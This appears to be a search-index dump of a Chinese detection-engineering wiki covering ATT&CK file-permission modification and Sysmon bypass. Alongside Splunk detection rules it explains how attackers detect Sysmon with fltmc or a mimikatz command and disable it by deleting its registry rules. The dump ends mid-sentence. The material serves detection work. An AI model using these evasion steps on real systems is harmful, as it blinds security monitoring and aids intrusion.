\u7684\u7ee7\u627f\u9009\u9879\u53ef\u4ee5\u4f18\u5148\u4e8e\u7ea7\u522b\uff0c\u4f46\u53ea\u5e94\u7528\u4e8e \u76ee\u5f55\u3002 /inheritance:e|d|r e - \u542f\u7528\u7ee7\u627f d - \u7981\u7528\u7ee7\u627f\u5e76\u590d\u5236 ACE r - \u5220\u9664\u6240\u6709\u7ee7\u627f\u7684 ACE \u6ce8\u610f: Sid \u53ef\u4ee5\u91c7\u7528\u6570\u5b57\u683c\u5f0f\u6216\u53cb\u597d\u7684\u540d\u79f0\u683c\u5f0f\u3002\u5982\u679c\u7ed9\u5b9a\u6570\u5b57\u683c\u5f0f\uff0c \u90a3\u4e48\u8bf7\u5728 SID \u7684\u5f00\u5934\u6dfb\u52a0\u4e00\u4e2a *\u3002</p> <p> /T \u6307\u793a\u5728\u4ee5\u8be5\u540d\u79f0\u6307\u5b9a\u7684\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u5339\u914d\u6587\u4ef6/\u76ee\u5f55\u4e0a \u6267\u884c\u6b64\u64cd\u4f5c\u3002ICACLS \u4fdd\u7559 ACE \u9879\u7684\u89c4\u8303\u987a\u5e8f: \u663e\u5f0f\u62d2\u7edd \u663e\u5f0f\u6388\u4e88 \u7ee7\u627f\u7684\u62d2\u7edd \u7ee7\u627f\u7684\u6388\u4e88 perm \u662f\u6743\u9650\u63a9\u7801\uff0c\u53ef\u4ee5\u4e24\u79cd\u683c\u5f0f\u4e4b\u4e00\u6307\u5b9a: \u7b80\u5355\u6743\u9650\u5e8f\u5217: N - \u65e0\u8bbf\u95ee\u6743\u9650 F - \u5b8c\u5168\u8bbf\u95ee\u6743\u9650 M - \u4fee\u6539\u6743\u9650 RX - \u8bfb\u53d6\u548c\u6267\u884c\u6743\u9650 R - \u53ea\u8bfb\u6743\u9650 W - \u53ea\u5199\u6743\u9650 D - \u5220\u9664\u6743\u9650 \u5728\u62ec\u53f7\u4e2d\u4ee5\u9017\u53f7\u5206\u9694\u7684\u7279\u5b9a\u6743\u9650\u5217\u8868: DE - \u5220\u9664 RC - \u8bfb\u53d6\u63a7\u5236 WDAC - \u5199\u5165 DAC WO - \u5199\u5165\u6240\u6709\u8005 S - \u540c\u6b65 AS - \u8bbf\u95ee\u7cfb\u7edf\u5b89\u5168\u6027 MA - \u5141\u8bb8\u7684\u6700\u5927\u503c GR - \u4e00\u822c\u6027\u8bfb\u53d6 GW - \u4e00\u822c\u6027\u5199\u5165 GE - \u4e00\u822c\u6027\u6267\u884c GA - \u5168\u4e3a\u4e00\u822c\u6027 RD - \u8bfb\u53d6\u6570\u636e/\u5217\u51fa\u76ee\u5f55 WD - \u5199\u5165\u6570\u636e/\u6dfb\u52a0\u6587\u4ef6 AD - \u9644\u52a0\u6570\u636e/\u6dfb\u52a0\u5b50\u76ee\u5f55 REA - \u8bfb\u53d6\u6269\u5c55\u5c5e\u6027 WEA - \u5199\u5165\u6269\u5c55\u5c5e\u6027 X - \u6267\u884c/\u904d\u5386 DC - \u5220\u9664\u5b50\u9879 RA - \u8bfb\u53d6\u5c5e\u6027 WA - \u5199\u5165\u5c5e\u6027 \u7ee7\u627f\u6743\u9650\u53ef\u4ee5\u4f18\u5148\u4e8e\u6bcf\u79cd\u683c\u5f0f\uff0c\u4f46\u53ea\u5e94\u7528\u4e8e \u76ee\u5f55: (OI) - \u5bf9\u8c61\u7ee7\u627f (CI) - \u5bb9\u5668\u7ee7\u627f (IO) - \u4ec5\u7ee7\u627f (NP) - \u4e0d\u4f20\u64ad\u7ee7\u627f (I) - \u4ece\u7236\u5bb9\u5668\u7ee7\u627f\u7684\u6743\u9650 \u793a\u4f8b: icacls c:\\windows\\* /save AclFile /T - \u5c06 c:\\windows \u53ca\u5176\u5b50\u76ee\u5f55\u4e0b\u6240\u6709\u6587\u4ef6\u7684 ACL \u4fdd\u5b58\u5230 AclFile\u3002 icacls c:\\windows\\ /restore AclFile - \u5c06\u8fd8\u539f c:\\windows \u53ca\u5176\u5b50\u76ee\u5f55\u4e0b\u5b58\u5728\u7684 AclFile \u5185 \u6240\u6709\u6587\u4ef6\u7684 ACL\u3002 icacls file /grant Administrator:(D,WDAC) - \u5c06\u6388\u4e88\u7528\u6237\u5bf9\u6587\u4ef6\u5220\u9664\u548c\u5199\u5165 DAC \u7684\u7ba1\u7406\u5458\u6743\u9650\u3002 icacls file /grant *S-1-1-0:(D,WDAC) - \u5c06\u6388\u4e88\u7531 sid S-1-1-0 \u5b9a\u4e49\u7684\u7528\u6237\u5bf9\u6587\u4ef6\u5220\u9664\u548c\u5199\u5165 DAC \u7684\u6743\u9650\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#_5","text":"\u76d1\u89c6\u5e76\u8c03\u67e5\u4fee\u6539ACL\u548c\u6587\u4ef6\u6216\u76ee\u5f55\u6240\u6709\u6743\u7684\u5c1d\u8bd5\u3002\u8bb8\u591a\u7528\u4e8e\u4fee\u6539ACL\u548c\u6587\u4ef6/\u76ee\u5f55\u6240\u6709\u6743\u7684\u547d\u4ee4\u662f\u5185\u7f6e\u7684\u7cfb\u7edf\u5b9e\u7528\u7a0b\u5e8f\uff0c\u5e76\u4e14\u53ef\u80fd\u4f1a\u4ea7\u751f\u5f88\u9ad8\u7684\u8bef\u62a5\u7387\uff0c\u56e0\u6b64\uff0c\u8bf7\u4e0e\u57fa\u51c6\u77e5\u8bc6\u8fdb\u884c\u6bd4\u8f83\uff0c\u4ee5\u4e86\u89e3\u901a\u5e38\u5982\u4f55\u4f7f\u7528\u7cfb\u7edf\u5e76\u5c06\u4fee\u6539\u4e8b\u4ef6\u4e0e\u5176\u4ed6\u6076\u610f\u6d3b\u52a8\u6307\u793a\u76f8\u5173\u8054\u5728\u53ef\u80fd\u7684\u60c5\u51b5\u3002 \u8003\u8651\u5bf9\u5305\u542b\u5173\u952e\u4e8c\u8fdb\u5236\u6587\u4ef6/\u914d\u7f6e\u6587\u4ef6\u7684\u6587\u4ef6\u5939\u542f\u7528\u6587\u4ef6/\u76ee\u5f55\u6743\u9650\u66f4\u6539\u5ba1\u6838\u3002\u4f8b\u5982\uff0c\u4fee\u6539DACL\u65f6\u4f1a\u521b\u5efaWindows\u5b89\u5168\u65e5\u5fd7\u4e8b\u4ef6\uff08\u4e8b\u4ef6ID 4670\uff09","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#splunk","text":"index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image IN (\u201c*\\\\icacls.exe\u201d , \u201c*\\\\takeown.exe\u201d , \u201c*\\\\attrib.exe\u201d)) OR (EventCode=1 CommandLine=\u201d*/grant*\u201d) //File and Folder permission modification","title":"splunk\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#_6","text":"\u5982\u679c\u4f60\u5bf9windows\u6709\u8db3\u591f\u591a\u7684\u4e86\u89e3\uff0c\u90a3\u4e48\u76f8\u4fe1\u4f60\u4e5f\u77e5\u9053\u5e94\u8be5\u5982\u4f55\u53bb\u7528Windows\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\u6b64\u7c7b\u653b\u51fb\u884c\u4e3a\uff0c\u6bd4\u5982\u4f9d\u97604688\u4e2d\u7684\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-001-win-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9md/#_7","text":"MITRE-ATT&CK-T1222-001 https://attack.mitre.org/techniques/T1222/001/ windows\u4e2d\u4f7f\u7528icacls\u547d\u4ee4\u8fd8\u539f\u6587\u4ef6\u5939\u7684\u6743\u9650\u8bbe\u7f6e https://www.jb51.net/os/windows/155450.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/","text":"T1222-002-linux-\u6587\u4ef6\u6743\u9650\u4fee\u6539 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u6587\u4ef6\u6743\u9650\u901a\u5e38\u6709\u6587\u4ef6\u7684\u6240\u6709\u8005\u6307\u5b9a\u7684\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\u5217\u8868(DACL)\u7ba1\u7406\u3002\u6587\u4ef6DACL\u5b9e\u73b0\u53ef\u80fd\u56e0\u4e0d\u540c\u7cfb\u7edf\u800c\u5f02\uff0c\u4f46\u901a\u5e38\u660e\u786e\u6307\u5b9a\u90a3\u4e9b\u7528\u6237/\u7ec4\u53ef\u4ee5\u6267\u884c\u90a3\u4e9b\u64cd\u4f5c\uff08\u4f8b\u5982\uff1a\u8bfb\u53d6\u3001\u5199\u5165\u3001\u6267\u884c\u7b49\uff09\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4fee\u6539\u6587\u4ef6\u6743\u9650/\u5c5e\u6027\u6765\u9003\u907f\u9884\u5b9a\u7684DACL\u7b56\u7565\uff0c\u4fee\u6539\u53ef\u80fd\u5305\u62ec\u66f4\u6539\u7279\u5b9a\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u8fd9\u53ef\u80fd\u9700\u8981\u83b7\u53d6\u6587\u4ef6\u7684\u6240\u6709\u6743\u6216\u63d0\u5347\u6743\u9650\uff0c\u4f8b\u5982\uff1aadminister/root\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u6587\u4ef6\u7684\u73b0\u6709\u6743\u9650\u3002\u7279\u5b9a\u6587\u4ef6\u4fee\u6539\u53ef\u80fd\u662f\u8bb8\u591a\u6280\u672f\u7684\u5fc5\u9700\u6b65\u9aa4\uff0c\u4f8b\u5982\u901a\u8fc7\u8f85\u52a9\u529f\u80fd\uff0c\u767b\u9646\u811a\u672c\u5efa\u7acb\u6301\u4e45\u6027\uff0c\u6216\u8005\u6c61\u67d3/\u52ab\u6301\u5176\u4ed6\u5de5\u5177\u7684\u914d\u7f6e\u6587\u4ef6\u7b49\u3002 \u6d4b\u8bd5\u6848\u4f8b chmod 766 abc.txt chmod u+x abc.txt #abc.txt\u6587\u4ef6\u5c5e\u4e3b\u6743\u9650\uff0c\u5177\u6709\u6267\u884c\u6743\u9650 chmod o-x abc.txt #\u53d6\u6d88\u5176\u4ed6\u7528\u6237\u5bf9abc.txt\u7684\u6267\u884c\u6743\u9650 chown runoob:runoobgroup abc.txt \u5c06\u6587\u4ef6 abc.txt \u7684\u62e5\u6709\u8005\u8bbe\u4e3a runoob\uff0c\u7fa4\u4f53\u7684\u4f7f\u7528\u8005 runoobgroup \u68c0\u6d4b\u65e5\u5fd7 linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09 bash\u5386\u53f2\u8bb0\u5f55 \u6d4b\u8bd5\u590d\u73b0 icbc@icbc:~$ sudo chmod 766 abc.txt ...... icbc@icbc:~$ sudo chmod u+x abc.txt \u6d4b\u8bd5\u7559\u75d5 \u57fa\u4e8eaudit\u65e5\u5fd7 \u6682\u65e0 \u57fa\u4e8e\u5386\u53f2\u8bb0\u5f55 icbc@icbc:~$ histroy 646 sudo chmod 766 abc.txt 647 sudo chmod u+x abc.txt \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u89c4\u5219 \u57fa\u4e8eaudit\u65e5\u5fd7 index=linux sourcetype=linux_audit syscall=90 OR syscall=91 OR sycall=268 | table msg,syscall,syscall_name,success,auid,comm,exe \u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55 index=linux sourcetype=\"bash_history\" bash_command=\"chmod \" OR bash_command=\"chown \" | table host,user_name,bash_command \u5efa\u8bae \u503c\u7684\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u767d\u540d\u5355\u8fdb\u884c\u6570\u636e\u964d\u566a\uff0c\u5426\u5219\u4f60\u53ef\u80fd\u4f1a\u5728\u65e0\u4f11\u6b62\u7684\u53bb\u8bef\u62a5\u7684\u8def\u4e0a\u8d8a\u8d70\u8d8a\u8fdc\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1222-002 https://attack.mitre.org/techniques/T1222/002/ Audit\u914d\u7f6e\u624b\u518c https://www.cnblogs.com/bldly1989/p/7204358.html DACL\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\u5217\u8868 https://baike.baidu.com/item/DACL/10681774?fr=aladdin linux\u4e0bchmod\u547d\u4ee4\u7528\u6cd5 https://blog.csdn.net/shinehoo/article/details/5821354 linux\u4e0bchown\u547d\u4ee4\u7528\u6cd5 https://www.runoob.com/linux/linux-comm-chown.html","title":"T1222-002-linux-\u6587\u4ef6\u6743\u9650\u4fee\u6539"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#t1222-002-linux-","text":"","title":"T1222-002-linux-\u6587\u4ef6\u6743\u9650\u4fee\u6539"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#attck","text":"\u6587\u4ef6\u6743\u9650\u901a\u5e38\u6709\u6587\u4ef6\u7684\u6240\u6709\u8005\u6307\u5b9a\u7684\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\u5217\u8868(DACL)\u7ba1\u7406\u3002\u6587\u4ef6DACL\u5b9e\u73b0\u53ef\u80fd\u56e0\u4e0d\u540c\u7cfb\u7edf\u800c\u5f02\uff0c\u4f46\u901a\u5e38\u660e\u786e\u6307\u5b9a\u90a3\u4e9b\u7528\u6237/\u7ec4\u53ef\u4ee5\u6267\u884c\u90a3\u4e9b\u64cd\u4f5c\uff08\u4f8b\u5982\uff1a\u8bfb\u53d6\u3001\u5199\u5165\u3001\u6267\u884c\u7b49\uff09\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4fee\u6539\u6587\u4ef6\u6743\u9650/\u5c5e\u6027\u6765\u9003\u907f\u9884\u5b9a\u7684DACL\u7b56\u7565\uff0c\u4fee\u6539\u53ef\u80fd\u5305\u62ec\u66f4\u6539\u7279\u5b9a\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u8fd9\u53ef\u80fd\u9700\u8981\u83b7\u53d6\u6587\u4ef6\u7684\u6240\u6709\u6743\u6216\u63d0\u5347\u6743\u9650\uff0c\u4f8b\u5982\uff1aadminister/root\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u6587\u4ef6\u7684\u73b0\u6709\u6743\u9650\u3002\u7279\u5b9a\u6587\u4ef6\u4fee\u6539\u53ef\u80fd\u662f\u8bb8\u591a\u6280\u672f\u7684\u5fc5\u9700\u6b65\u9aa4\uff0c\u4f8b\u5982\u901a\u8fc7\u8f85\u52a9\u529f\u80fd\uff0c\u767b\u9646\u811a\u672c\u5efa\u7acb\u6301\u4e45\u6027\uff0c\u6216\u8005\u6c61\u67d3/\u52ab\u6301\u5176\u4ed6\u5de5\u5177\u7684\u914d\u7f6e\u6587\u4ef6\u7b49\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#_1","text":"chmod 766 abc.txt chmod u+x abc.txt #abc.txt\u6587\u4ef6\u5c5e\u4e3b\u6743\u9650\uff0c\u5177\u6709\u6267\u884c\u6743\u9650 chmod o-x abc.txt #\u53d6\u6d88\u5176\u4ed6\u7528\u6237\u5bf9abc.txt\u7684\u6267\u884c\u6743\u9650 chown runoob:runoobgroup abc.txt \u5c06\u6587\u4ef6 abc.txt \u7684\u62e5\u6709\u8005\u8bbe\u4e3a runoob\uff0c\u7fa4\u4f53\u7684\u4f7f\u7528\u8005 runoobgroup","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#_2","text":"linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09 bash\u5386\u53f2\u8bb0\u5f55","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#_3","text":"icbc@icbc:~$ sudo chmod 766 abc.txt ...... icbc@icbc:~$ sudo chmod u+x abc.txt","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#_4","text":"\u57fa\u4e8eaudit\u65e5\u5fd7 \u6682\u65e0 \u57fa\u4e8e\u5386\u53f2\u8bb0\u5f55 icbc@icbc:~$ histroy 646 sudo chmod 766 abc.txt 647 sudo chmod u+x abc.txt","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#splunk","text":"","title":"splunk\u89c4\u5219"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#audit","text":"index=linux sourcetype=linux_audit syscall=90 OR syscall=91 OR sycall=268 | table msg,syscall,syscall_name,success,auid,comm,exe","title":"\u57fa\u4e8eaudit\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#bash","text":"index=linux sourcetype=\"bash_history\" bash_command=\"chmod \" OR bash_command=\"chown \" | table host,user_name,bash_command","title":"\u57fa\u4e8ebash\u5386\u53f2\u8bb0\u5f55"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#_6","text":"\u503c\u7684\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u521b\u5efa\u4e00\u4e2a\u767d\u540d\u5355\u8fdb\u884c\u6570\u636e\u964d\u566a\uff0c\u5426\u5219\u4f60\u53ef\u80fd\u4f1a\u5728\u65e0\u4f11\u6b62\u7684\u53bb\u8bef\u62a5\u7684\u8def\u4e0a\u8d8a\u8d70\u8d8a\u8fdc\u3002","title":"\u5efa\u8bae"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1222-002-linux-%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E4%BF%AE%E6%94%B9/#_7","text":"MITRE-ATT&CK-T1222-002 https://attack.mitre.org/techniques/T1222/002/ Audit\u914d\u7f6e\u624b\u518c https://www.cnblogs.com/bldly1989/p/7204358.html DACL\u81ea\u4e3b\u8bbf\u95ee\u63a7\u5236\u5217\u8868 https://baike.baidu.com/item/DACL/10681774?fr=aladdin linux\u4e0bchmod\u547d\u4ee4\u7528\u6cd5 https://blog.csdn.net/shinehoo/article/details/5821354 linux\u4e0bchown\u547d\u4ee4\u7528\u6cd5 https://www.runoob.com/linux/linux-comm-chown.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/","text":"T1562-001-windows-\u7ed5\u8fc7sysmon \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u7531\u76d1\u6d4b\u8f6f\u4ef6\u6216\u8fdb\u7a0b\u6355\u83b7\u5230\u7684\u544a\u8b66\uff0c\u4ee5\u53ca\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6216\u6ce8\u518c\u8868\u9879\u4e2d\u7684\u76d1\u6d4b\u8f6f\u4ef6\u7684\u8bbe\u7f6e\uff0c\u4ee5\u8fbe\u5230\u9003\u907f\u8ffd\u8e2a\u7684\u76ee\u7684\u3002 \u5728\u57fa\u4e8e\u7279\u5f81\u76d1\u6d4b\u7684\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u963b\u6b62\u76d1\u6d4b\u7279\u5f81\u76f8\u5173\u7684\u6570\u636e\u88ab\u53d1\u9001\u51fa\u53bb\uff0c\u4ee5\u4fbf\u4e8e\u963b\u6b62\u5b89\u5168\u4eba\u5458\u8fdb\u884c\u5206\u6790\u3002\u8fd9\u53ef\u4ee5\u6709\u5f88\u591a\u65b9\u5f0f\u5b9e\u73b0\uff0c\u4f8b\u5982\u505c\u6b62\u8d1f\u8d23\u8f6c\u53d1\u7684\u8fdb\u7a0b\uff08splunk\u8f6c\u53d1\u5668\u3001Filebate\u3001rsyslog\u7b49\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4f17\u6240\u5468\u77e5\uff0csysmon\u53ef\u4ee5\u5e2e\u52a9\u5b89\u5168\u4eba\u5458\u8bb0\u5f55\u5f88\u591a\u5b89\u5168\u4e8b\u4ef6\uff0c\u76ee\u524dsysmon\u6700\u65b0\u7248\u672c\u5df2\u7ecf\u662f10.X\u7248\u672c\u3002\u5bf9\u4e8e\u653b\u51fb\u8005\u6765\u8bb2\uff0c\u4ed6\u4eec\u53ef\u80fd\u9700\u8981\u786e\u5b9a\u76ee\u6807\u4e3b\u673a\u662f\u5426\u5b58\u5728sysmon\u3002\u901a\u5e38\uff0c\u653b\u51fb\u8005\u662f\u4e0d\u4f1a\u53bb\u68c0\u6d4b\u4ed6\u4eec\u5165\u4fb5\u7684\u4e3b\u673a\u4e0a\u662f\u5426\u5b58\u5728sysmon\u3002 \u5982\u4f55\u68c0\u6d4b\u88ab\u5165\u4fb5\u7684\u4e3b\u673a\u662f\u5426\u5b58\u5728sysmon\uff0c\u5f88\u591a\u653b\u51fb\u8005\u4e00\u822c\u6267\u884c\u4ee5\u4e0b\u7684\u4e00\u79cd\u64cd\u4f5c\uff1a \u679a\u4e3e\u8fdb\u7a0b\uff1b \u679a\u4e3e\u670d\u52a1\uff1b \u679a\u4e3eC:\\Windows\\System32\\Drivers\u4e0b\u7684\u9a71\u52a8\uff1b \u4f46\u662f\uff0c\u4f60\u5e94\u8be5\u77e5\u9053sysmon\u53ef\u4ee5\u5b9e\u73b0\u4ee5\u4e0b\u529f\u80fd\uff1a\u7528\u6237\u53ef\u4ee5\u5728\u5176\u4e2d\u66f4\u6539\u53ef\u6267\u884c\u6587\u4ef6\u548c\u9a71\u52a8\u6587\u4ef6\u7684\u540d\u79f0\uff0c\u4ee5\u4fbf\u5176\u5728\u7cfb\u7edf\u4e2d\u7684\u5b58\u5728\u8fdb\u884c\u6a21\u7cca\u5904\u7406\u3002 \u4e0d\u8fc7\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528fltmc.exe\u67e5\u770b\u5176altitude\u53f7\u7801\uff0csysmon\u7684altitude\u53f7\u7801\u662f385201\uff0c\u56fa\u5b9a\u4e0d\u53d8\u7684\u3002 \u4f7f\u7528fltmc.exe\u5f97\u5230\u7684altitude\u53f7\uff1a Windows PowerShell \u7248\u6743\u6240\u6709 (C) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 PS C:\\Users\\Administrator> fltmc.exe \u7b5b\u9009\u5668\u540d\u79f0 \u6570\u5b57\u5b9e\u4f8b \u9ad8\u5ea6 \u6846\u67b6 ------ SysmonDrv 2 385201 0 luafv 1 135000 0 \u5728Mimikatz\u4e2d\u4f7f\u7528misc::mflt\u547d\u4ee4\u5f97\u5230\u7684altitude\u53f7\uff1a mimikatz # misc::mflt 0 2 385201 SysmonDrv 0 1 135000 luafv \u5173\u4e8e\u66f4\u591a\u7684\u5982\u4f55\u68c0\u6d4b\u88ab\u5165\u4fb5\u7684\u4e3b\u673a\u662f\u5426\u5b58\u5728sysmon\uff0c\u4f60\u53ef\u4ee5\u53c2\u8003\uff1a https://anquan.baidu.com/article/350\uff0c\u5982\u4f55\u68c0\u6d4bsysmon\u4e0d\u662f\u672c\u6587\u7684\u91cd\u70b9. \u7ed5\u8fc7Sysmon\u7684\u4e24\u79cd\u65b9\u6cd5 \u76ee\u524d\uff0c\u653b\u51fb\u8005\u67092\u4e2a\u7ed5\u8fc7sysmon\u7684\u65b9\u6cd5\uff0c\u7b2c\u4e00\u4e2a\u662f\u5728\u5229\u7528sysmon\u8fdb\u7a0b\u4e2d\u7684\u76f2\u70b9\uff0c\u7b2c\u4e8c\u79cd\u5219\u662f\u76f4\u63a5\u7981\u7528sysmon\u3002 \u5220\u9664\u914d\u7f6e\u9879 \u653b\u51fb\u8005\u53ef\u4ee5\u5220\u9664\u6ce8\u518c\u8868\u4e2d\u7684\u89c4\u5219\u9879\uff0c\u6b64\u65f6\uff0c Sysmon\u5728\u53d1\u73b0\u6ce8\u518c\u8868\u88ab\u66f4\u6539\u540e\uff0c\u5b83\u5c06\u81ea\u52a8\u91cd\u65b0\u52a0\u8f7d\u914d\u7f6e\u3002\u7531\u4e8e\u6b64\u65f6\u6ca1\u6709\u4efb\u4f55\u5b89\u5168\u68c0\u6d4b\u89c4\u5219\u5b58\u5728\uff0c\u5b83\u5c06\u6682\u65f6\u5931\u53bb\u9632\u62a4\u80fd\u529b\uff0c\u4e0d\u8fc7\u5931\u6548\u65f6\u95f4\uff0c\u53d6\u51b3\u4e8e\u914d\u7f6e\u7684\u7ef4\u62a4\u65b9\u5f0f\u3002\u5982\u679c\u914d\u7f6e\u7531Ansible\uff0cChef\u6216DSC\u7b49\u914d\u7f6e\u7ba1\u7406\u7cfb\u7edf\u7ba1\u7406\uff0c\u53ef\u80fd\u9700\u8981\u51e0\u79d2\u5230\u51e0\u5206\u949f\u624d\u80fd\u5c06\u914d\u7f6e\u66f4\u6539\u56de\u539f\u59cb\u72b6\u6001\uff0c\u5982\u679c\u4f7f\u7528GPO\u6765\u7ba1\u7406\uff0c\u90a3\u4e48\u5f53GPO\u66f4\u65b0\u65f6\uff0c\u53ef\u4ee5\u572890\u5206\u949f\u5185\u6062\u590d\u539f\u59cb\u72b6\u6001\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u5404\u79cdWindows\u6280\u672f\uff08\u5982.Net\u3001VBS\u3001PE\u6587\u4ef6\u7b49\uff09\u521b\u5efaVMI\u4e34\u65f6\u6027Consumer\u76d1\u63a7\u76f8\u5e94\u7684\u6ce8\u518c\u8868\u9879\uff0c\u5f53\u53d1\u73b0\u4fee\u6539\u64cd\u4f5c\u65f6\uff0c\u5219\u4f1a\u5220\u9664\u4fee\u6539\u6570\u636e\u6216\u8005\u91cd\u65b0\u8bbe\u7f6e\u8868\u9879\u5185\u5bb9\u3002\u4e4b\u6240\u4ee5\u4f7f\u7528\u4e34\u65f6\u7684Consumer\uff0c\u662f\u56e0\u4e3a\u5927\u591a\u6570